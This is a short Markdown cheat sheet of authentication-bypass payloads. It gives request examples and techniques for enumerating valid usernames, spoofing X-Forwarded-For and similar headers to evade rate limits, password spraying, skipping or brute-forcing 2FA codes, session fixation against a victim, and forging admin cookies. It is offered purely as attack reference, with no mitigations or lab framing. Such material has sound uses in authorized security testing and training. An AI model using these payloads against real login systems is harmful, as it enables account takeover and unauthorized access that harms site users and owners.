# Authentication Bypass - Payload Reference

## Username Enumeration

### Via Different Responses
```
POST /login
username=admin&password=wrong  → "Incorrect password" (valid user)
username=nobody&password=wrong → "Invalid username" (invalid user)
```

### Via Subtly Different Responses
```
# Difference might be:
# - Extra period at end of message
# - Different whitespace
# - Different capitalization
# - Different response length
```

### Via Response Timing
```
# Valid username takes longer (server checks password before responding)
# Invalid username responds immediately
# Binary search on timing differences
```

### Via Account Lock
```
# Send 5+ failed logins for valid username → "Account locked"
# Invalid username never gets locked
```

## Brute Force Bypass

### IP Block Bypass
```
# Alternate between correct and incorrect passwords
# correct → incorrect → correct → incorrect
# This resets the failed attempt counter
```

### Rate Limit Bypass
```
# Add headers:
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
```

### Password Spray
```
# Try common passwords across many users
# admin:password123
# user1:password123
# user2:password123
```

## 2FA Bypass

### Direct Access
```
# After entering correct password, try accessing protected page directly
GET /my-account  (skip 2FA code entry)
```

### Response Manipulation
```
# Change response body from {"success": false} to {"success": true}
```

### Brute Force 2FA Code
```
# If 4-digit code: 0000-9999
# No rate limit on 2FA codes = brute forceable
```

## Session Attacks

### Session Fixation
```
# If app accepts session ID from URL/cookie:
# 1. Get valid session ID
# 2. Send to victim: https://target.com/?session=attacker_session
# 3. Victim logs in with that session
# 4. Attacker uses same session = authenticated
```

### Cookie Manipulation
```
Cookie: session=admin
Cookie: role=administrator
Cookie: isAdmin=true
```
